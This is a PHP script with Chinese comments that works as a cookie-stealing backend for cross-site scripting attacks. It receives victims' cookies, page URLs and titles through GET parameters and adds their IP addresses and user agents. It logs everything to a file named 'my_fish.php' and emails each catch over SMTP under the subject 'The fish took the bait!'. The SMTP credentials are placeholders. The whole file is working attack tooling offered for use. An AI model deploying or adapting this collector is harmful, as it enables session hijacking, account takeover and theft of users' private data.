<?php

	/**
本人在本地PHP5.2环境中完美测试成功！
	By ☯KK--http://molok.lofter.com
	 */
	$ip =$_SERVER['REMOTE_ADDR'];
	$xip=$_SERVER['HTTP_X_FORWARDED_FOR'];
	$cip=$_SERVER['HTTP_CLIENT_IP'];

	$title=$_GET[title];
	$url=$_GET[url];
	$agent = $_SERVER['HTTP_USER_AGENT'];
	$data = $_GET[cookie];
	date_default_timezone_set('Asia/Shanghai');
	$time = date("Y-m-d G:i:s A");

	$text =$time." | IP =".$ip." |  x_forwarded_for  ".$xip."  | client_ip  ".$cip."<br><br>User Agent: ".$agent."<br>Referer: ".$url."<br>Title:   ".$title."<br>Cookie:  ".$data."<br><br><br>";

	$result_file = "my_fish.php"; //服务器上用来保存cookie的文件
	
	$file = fopen($result_file , 'a');
	fwrite($file,$text);//写入信息到文件
	fclose($file);

	require_once ("smtp.php");
	//******************** 配置信息 ********************************
	$smtpserver = "smtp.163.com";//SMTP服务器
	$smtpserverport =25;//SMTP服务器端口
	$smtpusermail = "xxx@163.com";//SMTP服务器的用户邮箱
	$smtpemailto = "xxx@xxx.com";//发送给谁
	$smtpuser = "xxx@xxx.com@163.com";//SMTP服务器的用户帐号
	$smtppass = "xxxxx";//SMTP服务器的用户密码
	$mailtitle = "鱼儿上钩了!";//邮件主题
	$mailcontent = $text;//邮件内容
	$mailtype = "HTML";//邮件格式（HTML/TXT）,TXT为文本邮件


	$smtp = new smtp($smtpserver,$smtpserverport,true,$smtpuser,$smtppass);//这里面的一个true是表示使用身份验证,否则不使用身份验证.
	$smtp->debug = false;//是否显示发送的调试信息
	$state = $smtp->sendmail($smtpemailto, $smtpusermail, $mailtitle, $mailcontent, $mailtype);

	echo "<div style='width:300px; margin:36px auto;'>";
	if($state==""){
		echo "对不起，邮件发送失败！";
		exit();
	}
	echo "恭喜！邮件发送成功！！";
	echo "</div>";
?>
